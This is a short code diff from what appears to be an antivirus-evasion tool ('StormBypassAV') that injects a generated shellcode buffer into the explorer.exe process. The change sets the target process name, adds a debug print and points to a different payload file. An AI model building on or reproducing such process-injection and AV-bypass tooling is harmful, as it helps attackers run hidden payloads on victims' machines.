@@ -20,8 +20,9 @@ def findPid(proName='explorer'):
     else:
         return -1
 
-def main(buf,process='explorer'):
+def main(buf,process='explorer.exe'):
     pid=findPid(process)[0]
+    print('???',pid)
     if not pid:
         print('no pid find')
         return
@@ -48,7 +49,7 @@ def main(buf,process='explorer'):
 
 if __name__ == '__main__':
     import shellcoder
-    buf=shellcoder.main('','',r"C:\Users\d\Desktop\hack\payloadJQuery.py",'','',True)
+    buf=shellcoder.main('','',r"D:\BaiduSyncdisk\dyb\a_penetration\kali_tools\my_project\project\BypassAV\StormBypassAV\config\payloadJQuery.py",'','',True)
     print('buf:\n',buf)
 
     if not buf:
